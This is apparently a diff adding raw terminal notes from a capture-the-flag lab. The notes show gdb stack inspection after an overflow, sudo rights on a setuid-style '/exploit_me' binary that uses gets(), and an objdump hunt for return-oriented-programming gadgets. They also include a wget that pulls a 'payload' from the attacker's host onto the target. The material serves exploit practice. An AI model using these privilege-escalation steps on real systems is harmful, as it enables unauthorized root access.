@@ -2283,4 +2283,109 @@ root@ip-10-81-91-142:~/Obscure#
 
 
 
+(gdb) info registers rsp
+rsp            0x7fffffffdfa8      0x7fffffffdfa8
+(gdb) x/gx $rsp
+0x7fffffffdfa8:	0x6161616c6161616b
+
+
+
+
+zeeshan@hydra:/$ sudo -l
+Matching Defaults entries for zeeshan on hydra:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User zeeshan may run the following commands on hydra:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /exploit_me
+
+
+
+
+ 400652:	41 5f                	pop    %r15
+  400654:	c3                   	retq   
+
+
+
+
+
+
+:~/Obscure# objdump -d exploit_me | grep -B 5 ret
+  40043c:	48 8b 05 b5 0b 20 00 	mov    0x200bb5(%rip),%rax        # 600ff8 <__gmon_start__>
+  400443:	48 85 c0             	test   %rax,%rax
+  400446:	74 05                	je     40044d <_init+0x15>
+  400448:	e8 63 00 00 00       	callq  4004b0 <__gmon_start__@plt>
+  40044d:	48 83 c4 08          	add    $0x8,%rsp
+  400451:	c3                   	retq   
+--
+  400510:	bf 48 10 60 00       	mov    $0x601048,%edi
+  400515:	ff e0                	jmpq   *%rax
+  400517:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
+  40051e:	00 00 
+  400520:	5d                   	pop    %rbp
+  400521:	c3                   	retq   
+--
+  40055d:	5d                   	pop    %rbp
+  40055e:	bf 48 10 60 00       	mov    $0x601048,%edi
+  400563:	ff e0                	jmpq   *%rax
+  400565:	0f 1f 00             	nopl   (%rax)
+  400568:	5d                   	pop    %rbp
+  400569:	c3                   	retq   
+--
+  400579:	55                   	push   %rbp
+  40057a:	48 89 e5             	mov    %rsp,%rbp
+  40057d:	e8 6e ff ff ff       	callq  4004f0 <deregister_tm_clones>
+  400582:	5d                   	pop    %rbp
+  400583:	c6 05 be 0a 20 00 01 	movb   $0x1,0x200abe(%rip)        # 601048 <__TMC_END__>
+  40058a:	f3 c3                	repz retq 
+--
+  4005db:	48 89 c7             	mov    %rax,%rdi
+  4005de:	b8 00 00 00 00       	mov    $0x0,%eax
+  4005e3:	e8 a8 fe ff ff       	callq  400490 <gets@plt>
+  4005e8:	b8 00 00 00 00       	mov    $0x0,%eax
+  4005ed:	c9                   	leaveq 
+  4005ee:	c3                   	retq   
+--
+  40064b:	5d                   	pop    %rbp
+  40064c:	41 5c                	pop    %r12
+  40064e:	41 5d                	pop    %r13
+  400650:	41 5e                	pop    %r14
+  400652:	41 5f                	pop    %r15
+  400654:	c3                   	retq   
+  400655:	90                   	nop
+  400656:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
+  40065d:	00 00 00 
+
+0000000000400660 <__libc_csu_fini>:
+  400660:	f3 c3                	repz retq 
+--
+Disassembly of section .fini:
+
+0000000000400664 <_fini>:
+  400664:	48 83 ec 08          	sub    $0x8,%rsp
+  400668:	48 83 c4 08          	add    $0x8,%rsp
+  40066c:	c3                   	retq 
+
+
+
+
+zeeshan@hydra:/tmp$ wget http://10.81.91.142:8000/payload
+--2026-02-08 22:03:08--  http://10.81.91.142:8000/payload
+Connecting to 10.81.91.142:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 104 [application/octet-stream]
+Saving to: \u2018payload\u2019
+
+payload                                  100%[=================================================================================>]     104  --.-KB/s    in 0s      
+
+2026-02-08 22:03:08 (23.5 MB/s) - \u2018payload\u2019 saved [104/104]
+
+zeeshan@hydra:/tmp$ ls
+payload  systemd-private-df7bfb703f4b4f06bb372f26230a82a5-systemd-timesyncd.service-VFzwCC
+zeeshan@hydra:/tmp$ cd ..
+zeeshan@hydra:/$ cp /tmp/payload .
+cp: cannot create regular file './payload': Permission denied
+
+
+
 
